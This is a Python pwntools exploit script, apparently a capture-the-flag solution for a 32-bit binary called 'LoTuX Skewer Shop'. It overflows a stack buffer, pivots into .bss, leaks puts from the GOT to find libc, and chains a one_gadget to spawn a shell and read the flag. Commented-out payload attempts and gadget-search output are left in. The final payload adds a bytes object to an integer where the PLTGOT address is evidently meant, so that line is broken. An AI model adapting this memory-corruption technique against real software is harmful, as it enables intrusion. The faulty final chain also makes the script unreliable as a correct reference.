#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = "debug"
if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        # gdb.attach(r,'b *0x8049196\nb *0x8049060\nb *0x80491f2\nb *0x80491e5')
        gdb.attach(
            r, "b *0x80491ed\nb *0x80491f2\n"
        )  # Breakpoint before read and after read.
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(-1)
elf = ELF("./chal")
bss = elf.bss()
log.info("bss: " + str(hex(bss)))  # 0x804c024
bss4 = bss + 0x400
bss6 = bss + 0x600  # 0x804c624
puts_plt = 0x8049060
main_addr = 0x8049196
puts_got = 0x804C014
read_in_main = 0x80491EB
read_plt = 0x8049050
leave_ret = 0x08049105
pop_ebx_ret = 0x08049022
bin_sh = 0x001B90F5
system_offset = 0x00047CB0
puts_offset = 0x00072830
# padding = cyclic(24)
# # Leaking Libc Base
# payload = padding
# payload += p32(read_in_main)
# payload += p32(main_addr)
# print(len(payload))
# padding(20) + ebp + esp
payload = b"a" * 20 + p32(bss4) + p32(read_in_main) + p32(bss4)
# x/32wx 0x804c024+0x600-20
r.sendafter("Welcome To LoTuX Skewer Shop!\n", payload)
# pause()
"""
payload = padding
payload += p32(puts_plt)
payload += p32(main_addr)
payload += p32(puts_got)
"""
# payload = b'a' * 20 + p32(bss4) + p32(read_in_main) + p32(0xDEADBEEF) # Read to 0x804c610 - 0x14(20)
# payload = b'a' * 20 + p32(bss6+0x20) + p32(read_in_main) + p32(0xDEADBEEF) # Read to 0x804c610 - 0x14(20)
# # r.sendline(payload)
# # payload=p32(bss+0x30)+p32(puts_plt)+p32(main_addr)+p32(puts_got)
# r.send(payload)
# payload=p32(puts_plt)+p32(bss6)+p32(puts_got)+p32(0xDEADBEEF)+p32(0xDEADBEEF)+p32(bss6)+p32(read_in_main)+p32(0xDEADBEEF)
# payload = p32(bss4) +p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)+p32(read_in_main)+p32(0xDEADBEEF)+p32(0xDEADBEEF)+p32(0xDEADBEEF)
# r.send(payload)
# payload = cyclic(20) + p32(bss6) + p32(read_in_main) +p32(0xDEADBEEF)
# r.send(payload)
# payload = p32(puts_plt)+p32(main_addr)+p32(puts_got)+p32(0xDEADBEEF) +p32(0xDEADBEEF)  + p32(bss4) + p32(read_in_main) +p32(0xDEADBEEF)
# r.send(payload)
r.send(
    p32(bss6)
    + p32(puts_plt)
    + p32(pop_ebx_ret)
    + p32(puts_got)
    + p32(read_plt)
    + p32(leave_ret)
    + p32(0)
    + p32(bss6)
    + p32(0x100)
)

leakedAddr = u32(r.recv(4))
r.recv(4)
log.success("Leaked puts at: " + hex(leakedAddr))
libc = leakedAddr - 0x00072830
log.success("Libc at: " + hex(libc))
# r.send(p32(bss4)+p32(system_offset+libc)+p32(0xDEADBEEF)+p32(bin_sh+libc))
"""
0x16ef01 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

Using grep with and ref: https://unix.stackexchange.com/questions/55359/how-to-run-grep-with-multiple-and-patterns
$ ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep -P '^(?=.*esi)(?=.*eax)'     
0x0004b1aa : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x000c88b7 : pop eax ; pop edi ; pop esi ; ret
0x0004b1a9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret

"""
pop_eax_pop_edi_pop_esi_ret = 0x000C88B7
'''
$ readelf -d libc.so.6 | grep PLTGOT
 0x00000003 (PLTGOT)                     0x226000
'''
PLTGOT = 0x226000
one_gadget = 0x16EF01
r.send(
    p32(bss4)
    + p32(pop_eax_pop_edi_pop_esi_ret + libc)
    + p32(0)
    + p32(0xDEADBEEF)
    + p32(payload + libc)
    + p32(one_gadget + libc)
)
r.recvuntil(b'\n')
r.sendline(b'cat /home/`whoami`/flag')
log.success('Shell out.')
r.interactive()
